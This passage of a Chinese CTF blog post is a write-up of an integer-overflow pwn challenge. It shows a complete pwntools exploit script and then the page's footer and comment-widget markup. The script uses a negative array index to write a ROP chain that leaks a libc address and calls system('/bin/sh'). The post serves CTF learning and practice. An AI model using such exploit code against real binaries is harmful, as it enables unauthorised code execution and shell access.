class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>) </span><br><span class="line">pop_rdi = <span class="number">0x400a33</span></span><br><span class="line">ret = <span class="number">0x400631</span></span><br><span class="line">hacker = <span class="number">0x4007f7</span></span><br><span class="line">main = <span class="number">0x4008fc</span></span><br><span class="line">start = <span class="number">0x4006f0</span></span><br><span class="line">magic = -<span class="number">2305843009213693939</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">idx, val</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;age:&quot;</span>, <span class="built_in">str</span>(val).encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name:&quot;</span>, <span class="string">b&quot;snowcat&quot;</span>)</span><br><span class="line">send_payload(magic, pop_rdi)</span><br><span class="line">send_payload(magic + <span class="number">1</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">send_payload(magic + <span class="number">2</span>, elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">send_payload(magic + <span class="number">3</span>, start)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>): send_payload(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0 0 0 0 0 0 0 0 0 0 &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name:&quot;</span>, <span class="string">b&quot;snowcat&quot;</span>)</span><br><span class="line">send_payload(magic, pop_rdi) </span><br><span class="line">send_payload(magic + <span class="number">1</span>, bin_sh_addr)</span><br><span class="line">send_payload(magic + <span class="number">2</span>, ret)</span><br><span class="line">send_payload(magic + <span class="number">3</span>, system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b 0x4008FA&quot;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>): send_payload(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 记一道PWN题(整数溢出)</li>
+        <li><strong>Author:</strong> Sadsnowcat</li>
+        <li><strong>Created at
+                :</strong> 2026-02-19 12:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-02-22 18:42:13
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://sadsnowcat.github.io/2026/02/19/hacker/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/02/17/buuoj/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">buu历险记</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">记一道PWN题(整数溢出)</div>
+		
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2026</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sadsnowcat</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        4 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
